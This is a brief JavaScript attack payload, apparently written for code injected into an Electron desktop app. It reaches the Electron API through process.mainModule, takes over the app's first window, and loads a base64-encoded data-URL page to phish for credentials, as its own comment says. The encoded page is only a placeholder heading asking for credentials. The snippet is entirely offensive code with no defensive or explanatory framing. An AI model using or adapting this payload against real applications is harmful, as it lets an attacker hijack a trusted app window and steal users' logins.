electron = process.mainModule.require('electron');
window = electron.webContents.getAllWebContents()[0];
let saved = window.getURL()
// Load inline content. Phish for some creds?
window.loadURL("data:text/html;base64,PGgxPnBscyBnaWIgY3JlZHo8L2gxPg==")
